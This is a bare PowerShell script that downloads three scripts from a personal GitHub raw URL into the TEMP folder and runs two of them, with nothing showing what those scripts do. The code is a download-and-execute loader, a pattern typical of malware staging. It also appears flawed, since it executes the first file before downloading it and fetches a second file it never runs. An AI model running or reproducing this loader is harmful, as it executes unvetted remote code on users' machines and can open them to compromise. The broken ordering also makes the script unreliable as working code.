$url1 = "https://raw.githubusercontent.com/cia168168/folder/main/RunV/MyScript.ps1"
$output1 = "$env:TEMP/MyScript.ps1"
& $output1
Invoke-WebRequest -Uri $url1 -OutFile $output1
Start-Sleep -Seconds 2
$url2 = "https://raw.githubusercontent.com/cia168168/folder/main/stop.ps1"
$output2 = "$env:TEMP/stop.ps1"
Invoke-WebRequest -Uri $url2 -OutFile $output2
Start-Sleep -Seconds 1
$url3 = "https://raw.githubusercontent.com/cia168168/folder/main/batt.ps1"
$output3 = "$env:TEMP/batt.ps1"
Invoke-WebRequest -Uri $url3 -OutFile $output3
& $output3
